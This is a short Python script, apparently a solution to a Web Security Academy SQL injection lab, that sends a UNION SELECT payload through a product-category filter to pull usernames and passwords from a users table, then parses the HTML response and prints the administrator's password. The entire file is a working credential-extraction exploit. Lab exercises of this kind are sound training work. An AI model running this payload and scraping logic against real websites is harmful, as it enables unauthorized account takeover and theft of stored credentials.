import requests
from bs4 import BeautifulSoup
site = "acda1f821e5dde1080308401007300e8.web-security-academy.net/filter?category=Corporate+gifts' UNION SELECT username,password from users --"
s = requests.Session()

url= f'https://{site}/'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
user_table = soup.find('table').find_all('tr')
admin_entry = [r.find('td').contents for r in user_table if 'administrator' in r.find('th')]
admin_password = admin_entry.pop().pop()
print(admin_password)